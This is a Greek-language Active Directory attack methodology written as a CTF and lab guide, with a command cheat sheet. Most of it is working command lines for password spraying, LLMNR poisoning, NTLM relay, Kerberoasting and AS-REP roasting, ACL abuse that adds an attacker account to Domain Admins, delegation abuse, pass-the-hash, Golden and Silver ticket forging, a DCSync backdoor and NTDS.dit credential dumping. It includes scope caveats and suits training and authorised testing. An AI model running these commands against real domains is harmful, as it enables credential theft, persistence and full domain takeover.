# 🏢 Μεθοδολογία ελέγχων Active Directory

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../README.md) • [🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md)

```
    █████╗ ██████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
   ██╔══██╗██╔══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
   ███████║██║  ██║   ███████║   ██║      ██║   ███████║██║     █████╔╝ 
   ██╔══██║██║  ██║   ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
   ██║  ██║██████╔╝   ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═╝  ╚═╝╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
         Βήματα ελέγχου πρόσβασης και δικαιωμάτων Active Directory
```

<p align="center">
  <img src="https://img.shields.io/badge/AD-Methodology-red?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/CTF-Guide-blue?style=for-the-badge" alt="CTF">
  <img src="https://img.shields.io/badge/Domain_Admin-green?style=for-the-badge" alt="DA">
</p>

---

## Πριν ξεκινήσετε

Το **Active Directory (AD)** είναι υπηρεσία καταλόγου για χρήστες, υπολογιστές, ομάδες και πολιτικές ενός οργανισμού. Ο οδηγός οργανώνει έναν εγκεκριμένο έλεγχο σε φάσεις: καταγραφή, αρχική πρόσβαση, διερεύνηση δικαιωμάτων, πρόσβαση σε άλλα συστήματα και αξιολόγηση συνολικού αντίκτυπου. Δεν είναι εγγυημένη διαδρομή προς διαχειριστή.

**Βασικοί όροι:** *domain* = περιοχή καταλόγου και ταυτοποίησης, *domain controller (DC)* = server που παρέχει υπηρεσίες AD, *forest* = σύνολο σχετικών domains, *SID* = αναγνωριστικό ασφάλειας, *ACL/ACE* = λίστα και εγγραφή δικαιωμάτων, *SPN* = όνομα υπηρεσίας Kerberos. Το **TGT** επιτρέπει αιτήματα άλλων tickets, ενώ το **ticket υπηρεσίας** αφορά συγκεκριμένη υπηρεσία.

Οι εντολές είναι παραδείγματα του πρωτοτύπου για εργαστήρια ή ρητά επιτρεπόμενο scope. Διατηρούνται αυτούσιες και δεν εκτελούνται εδώ. Φίλτρα, συλλέκτες και επιλογές εργαλείων χρειάζονται αντιστοίχιση στην εγκατεστημένη έκδοση. Καταγράψτε τις προϋποθέσεις και τα πραγματικά αποτελέσματα κάθε βήματος.

<a id="section-01"></a>

## 🗺️ Επισκόπηση διαδρομής ελέγχου

> **Εκπαιδευτική επισκόπηση:** Οι φάσεις μπορούν να επαναλαμβάνονται ή να μη σχετίζονται με κάθε περιβάλλον. Η αναγνώριση λογαριασμού, SPN ή συνεδρίας δεν εγγυάται εκμετάλλευση, αποκρυπτογράφηση ή δικαιώματα διαχειριστή. Τα εργαλεία συλλογής και τα διαπιστευτήρια πρέπει να αντιστοιχούν στο συμφωνημένο εργαστήριο ή scope.


```
┌─────────────────────────────────────────────────────────────────────────┐
│                     ΜΕΘΟΔΟΛΟΓΙΑ ΕΛΕΓΧΩΝ AD                                │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ΦΑΣΗ 1: Καταγραφή     ΦΑΣΗ 2: Αρχική πρόσβαση    ΦΑΣΗ 3: Κλιμάκωση │
│   ├── Έλεγχος δικτύου         ├── Δοκιμή κωδικού         ├── Kerberoast   │
│   ├── Καταγραφή LDAP            ├── Παραπλάνηση LLMNR           ├── AS-REP       │
│   ├── Καταγραφή χρηστών            └── Προώθηση NTLM             └── Έλεγχοι ACL    │
│   └── BloodHound                                                        │
│                                                                         │
│   ΦΑΣΗ 4: Μετακίνηση    ΦΑΣΗ 5: Διατήρηση      ΦΑΣΗ 6: Domain   │
│   ├── Pass-the-Hash        ├── Golden Ticket         ├── DCSync        │
│   ├── WinRM/PSExec         ├── Silver Ticket         ├── NTDS.dit      │
│   └── WMI Exec             └── Skeleton Key          └── Εύρος ελέγχου     │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Περιεχόμενα

- [🗺️ Επισκόπηση διαδρομής ελέγχου](#section-01)
- [🔍 Φάση 1: Αναγνώριση και καταγραφή](#section-02)
- [🔑 Φάση 2: Αρχική πρόσβαση](#section-03)
- [⬆️ Φάση 3: Κλιμάκωση προνομίων (Privilege Escalation)](#section-04)
- [➡️ Φάση 4: Πλευρική μετακίνηση (Lateral Movement)](#section-05)
- [🔒 Φάση 5: Διατήρηση πρόσβασης (Persistence)](#section-06)
- [👑 Φάση 6: Έλεγχοι συνολικής πρόσβασης στον domain](#section-07)
- [📊 Γρήγορη αναφορά εντολών](#section-08)
- [🎯 Συμβουλές για εργαστήρια CTF](#section-09)
- [📚 Σχετικοί οδηγοί](#section-10)

---

<a id="section-02"></a>

## 🔍 Φάση 1: Αναγνώριση και καταγραφή

### 1.1 Αναγνώριση δικτύου

```bash
# Αναζήτηση domain controllers
nmap -p 53,88,389,636,445 10.10.10.0/24

# Αναγνώριση υπηρεσιών AD
nmap -p 88,135,139,389,445,464,636,3268,3269 -sV 10.10.10.10
```

**Βασικές θύρες:**
| Θύρα | Υπηρεσία | Σκοπός |
|------|---------|---------|
| 53 | DNS | Επίλυση ονομάτων domain |
| 88 | Kerberos | Ταυτοποίηση |
| 389 | LDAP | Υπηρεσία καταλόγου |
| 445 | SMB | Κοινόχρηστοι φάκελοι |
| 636 | LDAPS | LDAP μέσω TLS |
| 5985 | WinRM | Απομακρυσμένη διαχείριση |

### 1.2 Καταγραφή με ανώνυμη πρόσβαση, όπου επιτρέπεται

```bash
# Ανώνυμη συνεδρία RPC, όπου επιτρέπεται
rpcclient -U "" -N 10.10.10.10
rpcclient $> enumdomusers
rpcclient $> enumdomgroups

# Ανώνυμη σύνδεση LDAP, όπου επιτρέπεται
ldapsearch -x -H ldap://10.10.10.10 -b "DC=domain,DC=local"

# Enum4linux
enum4linux -a 10.10.10.10

# Αναζήτηση χρηστών με Kerbrute χωρίς γνωστά διαπιστευτήρια
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt
```

### 1.3 Με έγκυρα στοιχεία σύνδεσης

```bash
# Πληροφορίες domain
crackmapexec smb 10.10.10.10 -u user -p password --users
crackmapexec smb 10.10.10.10 -u user -p password --groups
crackmapexec smb 10.10.10.10 -u user -p password --shares

# Καταγραφή LDAP
ldapdomaindump -u 'DOMAIN\user' -p 'password' 10.10.10.10
```

### 1.4 Καταγραφή μέσω PowerView

```powershell
# Εισαγωγή PowerView
Import-Module .\PowerView.ps1

# Πληροφορίες domain
Get-Domain
Get-DomainController

# Αναζήτηση λογαριασμών και συστημάτων ενδιαφέροντος
Get-DomainUser -SPN                    # Λογαριασμοί με SPN· απαιτούνται επιπλέον προϋποθέσεις
Get-DomainUser -PreauthNotRequired      # Λογαριασμοί χωρίς απαίτηση preauthentication
Get-DomainComputer -Unconstrained       # Delegation

# Αναζήτηση ενδείξεων συνεδριών Domain Admins
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
```

### 1.5 Συλλογή δεδομένων BloodHound

> **Τα ερωτήματα χρειάζονται ερμηνεία:** Ένα ερώτημα που δέχεται οποιονδήποτε τύπο ακμής μπορεί να εμφανίσει σχέσεις που δεν αποτελούν εκτελέσιμη διαδρομή. Το σύντομο DCSync ερώτημα με εναλλακτικές σχέσεις δεν αποδεικνύει ότι συνυπάρχουν όλα τα απαιτούμενα δικαιώματα στο domain. Επιβεβαιώστε κατεύθυνση, scope και αποτελεσματικά δικαιώματα.


```bash
# Από Linux με bloodhound-python
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All

# Από Windows με SharpHound
.\SharpHound.exe -c All
```

**Ερωτήματα BloodHound:**
```cypher
# Συντομότερη διαδρομή προς Domain Admins
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

# Λογαριασμοί με SPN για διερεύνηση Kerberoasting
MATCH (u:User {hasspn:true}) RETURN u.name

# Χρήστες με ενδείξεις δικαιωμάτων DCSync
MATCH (u:User)-[:DCSync|:GetChanges|:GetChangesAll]->(d:Domain) RETURN u.name
```

---

<a id="section-03"></a>

## 🔑 Φάση 2: Αρχική πρόσβαση

### 2.1 Δοκιμή λίγων κωδικών σε πολλούς λογαριασμούς (Password Spraying)

```bash
# Δοκιμή κωδικού με CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Δοκιμή κωδικού με Kerbrute
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'
```

**Παραδείγματα συνηθισμένων μοτίβων κωδικού:**
```
Εποχή και έτος: Summer2024!, Winter2024
Όνομα εταιρείας και αριθμοί: Company123!
Welcome1, Password1
```

### 2.2 Παραπλάνηση επίλυσης ονομάτων LLMNR/NBT-NS

> **Διαφορετικά δεδομένα πρόσβασης:** Η καταγραφή NetNTLMv2 περιλαμβάνει challenge/response και δεν είναι το NT hash που χρησιμοποιείται απευθείας στο Pass-the-Hash. Offline δοκιμή κωδικών και relay είναι διαφορετικές διαδικασίες· το relay προωθεί ζωντανή ανταλλαγή ταυτοποίησης και δεν είναι γενικά αναπαραγωγή αποθηκευμένης γραμμής.


```bash
# Τερματικό 1: εκκίνηση Responder
sudo responder -I eth0 -wPv

# Αναμονή για δεδομένα ταυτοποίησης...
# Ενδεικτική καταγραφή απόκρισης NetNTLMv2

# Τερματικό 2: έλεγχος υποψήφιων κωδικών
hashcat -m 5600 hash.txt rockyou.txt
```

### 2.3 Προώθηση ταυτοποίησης NTLM (relay)

> **Προϋποθέσεις relay:** Απουσία απαίτησης υπογραφής SMB είναι μόνο ένα σχετικό κριτήριο. Ταυτοποίηση χρήστη, endpoint, channel binding, προστασίες υπηρεσίας και δικαιώματα επηρεάζουν το αποτέλεσμα. Το σχόλιο SMB off απαιτεί αντίστοιχη αλλαγή ρυθμίσεων· δεν επιτυγχάνεται από τη σκέτη εντολή Responder.


```bash
# Αναζήτηση στόχων χωρίς απαίτηση υπογραφής SMB
crackmapexec smb 10.10.10.0/24 --gen-relay-list relay.txt

# Responder με SMB απενεργοποιημένο στη ρύθμιση· η εντολή μόνη της δεν το ορίζει
sudo responder -I eth0

# Έλεγχος προώθησης ταυτοποίησης
impacket-ntlmrelayx -tf relay.txt -smb2support
```

### 2.4 AS-REP Roasting — υπό προϋποθέσεις χωρίς γνωστό κωδικό

```bash
# Αναζήτηση λογαριασμών που πληρούν τις σχετικές προϋποθέσεις
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat

# Εναλλακτικά, με διαπιστευτήρια
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Δοκιμή υποψήφιων τιμών
hashcat -m 18200 asrep.txt rockyou.txt
```

---

<a id="section-04"></a>

## ⬆️ Φάση 3: Κλιμάκωση προνομίων (Privilege Escalation)

### 3.1 Kerberoasting — έλεγχος αντοχής κωδικών υπηρεσιών

> **Τύπος δεδομένων και κρυπτογράφησης:** Τα hashcat modes του πρωτοτύπου αντιστοιχούν σε συγκεκριμένες μορφές RC4/AS-REP. Δεν καλύπτουν κάθε AES ή Kerberos έξοδο. Ο λογαριασμός πρέπει να πληροί τις σχετικές προϋποθέσεις και ο κωδικός μπορεί να είναι πρακτικά μη ανακτήσιμος.


```bash
# Από Linux
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request

# Από Windows
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Δοκιμή υποψήφιων τιμών
hashcat -m 13100 kerberoast.txt rockyou.txt
```

### 3.2 Έλεγχος αξιοποίησης δικαιωμάτων ACL

**GenericAll σε λογαριασμό χρήστη:**
```powershell
# Αλλαγή κωδικού πρόσβασης
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force)
```

**GenericAll σε ομάδα:**
```powershell
# Προσθήκη λογαριασμού σε ομάδα
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
```

**GenericWrite:**
```powershell
# Ορισμός SPN σε λογαριασμό, ως παράδειγμα αλλαγής κατάστασης
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='any/thing'}
```

**WriteDACL:**
```powershell
# Προσθήκη δικαιωμάτων αναπαραγωγής DCSync σε λογαριασμό
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

### 3.3 Έλεγχοι ανάθεσης ταυτοποίησης (delegation)

> **Η παρουσία ρύθμισης δεν αρκεί:** Κάθε σενάριο delegation απαιτεί συγκεκριμένα δικαιώματα, υπηρεσίες, ελεγχόμενα κλειδιά και επιτρεπόμενους λογαριασμούς. Η δημιουργία λογαριασμού υπολογιστή ή η αλλαγή RBCD δεν είναι δεδομένα δικαιώματα ενός απλού χρήστη. Οι εντολές τροποποιούν κατάσταση.


**Μη περιορισμένη ανάθεση ταυτοποίησης:**
```powershell
# Αναζήτηση συστημάτων ενδιαφέροντος
Get-DomainComputer -Unconstrained

# Παρακολούθηση διαθέσιμων TGT
.\Rubeus.exe monitor /interval:5 /targetuser:DC$

# Παράδειγμα πρόκλησης ταυτοποίησης PrinterBug, υπό προϋποθέσεις
SpoolSample.exe DC01 YOURHOST
```

**Περιορισμένη ανάθεση ταυτοποίησης:**
```bash
# Αίτημα ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/serviceaccount:password -dc-ip 10.10.10.10

# Χρήση ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@target.domain.local
```

**Περιορισμένη ανάθεση βάσει πόρου (RBCD):**
```bash
# Δημιουργία λογαριασμού υπολογιστή
addcomputer.py -computer-name FAKE01 -computer-pass 'Password123!' domain.local/user:password

# Ρύθμιση RBCD
rbcd.py -delegate-from FAKE01 -delegate-to TARGET -action write domain.local/user:password

# Αίτημα ticket
getST.py -spn cifs/target.domain.local -impersonate administrator domain.local/FAKE01:'Password123!'
```

---

<a id="section-05"></a>

## ➡️ Φάση 4: Πλευρική μετακίνηση (Lateral Movement)

### 4.1 Pass-the-Hash — χρήση αποτυπώματος NT ως στοιχείου ταυτοποίησης

```bash
# PSExec με αποτύπωμα NT
impacket-psexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# WMIExec
impacket-wmiexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# SMBExec
impacket-smbexec -hashes :NTLMHASH domain.local/admin@10.10.10.10

# CrackMapExec
crackmapexec smb 10.10.10.10 -u admin -H NTLMHASH -x "whoami"
```

### 4.2 Pass-the-Ticket — χρήση διαθέσιμου ticket Kerberos

> **Μορφές ticket:** Το kirbi/Base64 του Rubeus και το ccache που χρησιμοποιούν συνήθως εργαλεία Linux δεν είναι αυτόματα το ίδιο αρχείο. Η εξαγωγή ticket δεν δημιουργεί από μόνη της το ticket.ccache του παραδείγματος. Χρειάζεται σωστή μορφή, principal, SPN, χρόνος και υπηρεσία.


```bash
# Εξαγωγή ticket
.\Rubeus.exe dump

# Χρήση κατάλληλου ticket σε Linux
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/admin@target

# Χρήση ticket σε Windows
.\Rubeus.exe ptt /ticket:base64ticket
```

### 4.3 WinRM

```bash
# Evil-WinRM με κωδικό πρόσβασης
evil-winrm -i 10.10.10.10 -u admin -p password

# Με αποτύπωμα NT
evil-winrm -i 10.10.10.10 -u admin -H NTLMHASH
```

### 4.4 Overpass-the-Hash — αίτημα ticket με διαθέσιμο κλειδί

```bash
# Αίτημα TGT με διαθέσιμο κλειδί
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# Χρήση Kerberos στη συνέχεια
dir \\server\share
```

---

<a id="section-06"></a>

## 🔒 Φάση 5: Διατήρηση πρόσβασης (Persistence)

> **Πρόσβαση και αποδοχή tickets:** Golden και Silver Tickets προϋποθέτουν διαφορετικά ήδη διαθέσιμα κλειδιά. Πρόσθετοι έλεγχοι KDC/PAC και σύγχρονες πολιτικές μπορούν να απορρίπτουν ιστορικά παραδείγματα. Η αλλαγή ACL ή λογαριασμών είναι πραγματική μεταβολή που απαιτεί συμφωνημένη επαναφορά.


### 5.1 Golden Ticket — πλαστογράφηση ticket με κλειδί krbtgt

```bash
# Απαιτούνται κατάλληλο κλειδί krbtgt, SID domain και οι υπόλοιπες προϋποθέσεις

# Δημιουργία ticket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domain.local administrator

# Χρήση
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass domain.local/administrator@dc01.domain.local
```

```powershell
# Mimikatz
kerberos::golden /user:administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### 5.2 Silver Ticket — πλαστογράφηση ticket υπηρεσίας

```bash
# Δημιουργία ticket υπηρεσίας
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local administrator
```

### 5.3 Διατήρηση δικαιωμάτων αναπαραγωγής DCSync

```powershell
# Προσθήκη δικαιωμάτων DCSync στον επιλεγμένο λογαριασμό
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity backdooruser -Rights DCSync
```

---

<a id="section-07"></a>

## 👑 Φάση 6: Έλεγχοι συνολικής πρόσβασης στον domain

### 6.1 DCSync

```bash
# Εξαγωγή στοιχείων πρόσβασης που επιτρέπει η συγκεκριμένη λειτουργία
impacket-secretsdump domain.local/admin:password@10.10.10.10

# Με αποτύπωμα NT
impacket-secretsdump -hashes :NTLMHASH domain.local/admin@10.10.10.10

# Συγκεκριμένος χρήστης
impacket-secretsdump domain.local/admin:password@10.10.10.10 -just-dc-user administrator
```

### 6.2 Εξαγωγή δεδομένων NTDS.dit

```bash
# Δημιουργία σκιώδους αντιγράφου
vssadmin create shadow /for=C:

# Αντιγραφή NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system

# Ανάλυση τοπικών αρχείων χωρίς σύνδεση στον στόχο
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### 6.3 Εξαγωγή μέσω CrackMapExec

```bash
# Εξαγωγή δεδομένων AD μέσω DCSync
crackmapexec smb DC01 -u admin -p password --ntds
```

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά εντολών

### Συλλογή πληροφοριών με εντολές μίας γραμμής

```bash
# Αναζήτηση domain controllers
nmap -p 88,389 --open 10.10.10.0/24

# Αναζήτηση χρηστών χωρίς γνωστά διαπιστευτήρια
kerbrute userenum -d domain.local --dc 10.10.10.10 /usr/share/wordlists/names.txt

# Αναζήτηση λογαριασμών χωρίς απαίτηση προταυτοποίησης
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# Kerberoast
GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request
```

### Συνοπτικός πίνακας ελέγχων

| Τρόπος ελέγχου | Εντολή |
|--------|---------|
| Δοκιμές κωδικών σε πολλούς λογαριασμούς | `crackmapexec smb DC -u users.txt -p 'Pass123!'` |
| AS-REP Roast | `GetNPUsers.py domain.local/ -usersfile u.txt -dc-ip DC` |
| Kerberoast | `GetUserSPNs.py domain.local/u:p -dc-ip DC -request` |
| DCSync | `secretsdump.py domain.local/admin:pass@DC` |
| Pass-the-Hash — χρήση αποτυπώματος NT ως στοιχείου ταυτοποίησης | `psexec.py -hashes :HASH domain.local/admin@target` |
| Golden Ticket — πλαστογράφηση ticket με κλειδί krbtgt | `ticketer.py -nthash KRBTGT -domain-sid SID -domain domain.local admin` |

### Αναζήτηση αρχικού δεδομένου από hash

| Τύπος hash | Λειτουργία Hashcat |
|-----------|--------------|
| NTLM | `-m 1000` |
| NTLMv2 | `-m 5600` |
| Kerberoast | `-m 13100` |
| AS-REP | `-m 18200` |

---

<a id="section-09"></a>

## 🎯 Συμβουλές για εργαστήρια CTF

1. **Ξεκινήστε με καταγραφή** — κατανοήστε τη διαμόρφωση και τις προϋποθέσεις
2. **Εξετάστε το AS-REP** — μόνο κατάλληλοι λογαριασμοί χωρίς preauthentication δίνουν αντίστοιχα δεδομένα
3. **Χρησιμοποιήστε BloodHound** — εξετάστε πιθανές διαδρομές και επαληθεύστε τις προϋποθέσεις
4. **Εξετάστε ACLs** — ελέγξτε ακριβές αντικείμενο και αποτελεσματικά δικαιώματα
5. **Εξετάστε delegation** — αναζητήστε τις πραγματικές ρυθμίσεις ανάθεσης
6. **Συνυπολογίστε το κλείδωμα λογαριασμών** — οι δοκιμές κωδικών μπορούν να επηρεάσουν χρήστες
7. **Καταγράψτε ασφαλώς τα ευρήματα πρόσβασης** — κρατήστε μόνο όσα επιτρέπει ο έλεγχος

---

<a id="section-10"></a>

## 📚 Σχετικοί οδηγοί

- [BloodHound](../../BloodHound/translations/README.el.md)
- [Impacket](../../Impacket/translations/README.el.md)
- [CrackMapExec](../../CrackMapExec/translations/README.el.md)
- [Rubeus](../../Rubeus/translations/README.el.md)
- [PowerView](../../PowerView/translations/README.el.md)
- [Responder](../../Responder/translations/README.el.md)
- [Evil-WinRM](../../Evil-WinRM/translations/README.el.md)
- [Mimikatz](../../Mimikatz/translations/README.el.md)

---

<p align="center">
  <b>🏢 Εξετάστε μεθοδικά τα δικαιώματα AD!</b><br>
  <i>Μεθοδολογία, έλεγχος προϋποθέσεων και τεκμηρίωση</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
